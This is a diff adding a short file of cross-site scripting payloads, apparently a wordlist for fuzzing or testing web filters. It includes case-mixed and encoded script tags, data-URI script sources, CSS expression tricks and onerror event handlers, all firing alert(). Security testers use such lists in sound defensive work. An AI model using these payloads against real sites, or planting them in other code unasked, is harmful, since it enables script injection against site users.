@@ -1,0 +1,14 @@
+<ScRipT>alert(66);</ScRipT>
+'"><sCripT>alert(77)</scRipT>
+'%22%3E%3CsCripT%3Ealert(77)%3C/scRipT%3E
+'`"><\x3Cscript>javascript:alert(1)</script>
+'`"><\x00script>javascript:alert(1)</script>
+<script src="data:text/plain\x2Cjavascript:alert(1)"></script>
+<script src="data:\xD4\x8F,javascript:alert(1)"></script>
+<script src="data:\xE0\xA4\x98,javascript:alert(1)"></script>
+ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
+`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
+"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
+<image src=1 href=1 onerror="javascript:alert(1)"></image>
+<object src=1 href=1 onerror="javascript:alert(1)"></object>
+<script src=1 href=1 onerror="javascript:alert(1)"></script>
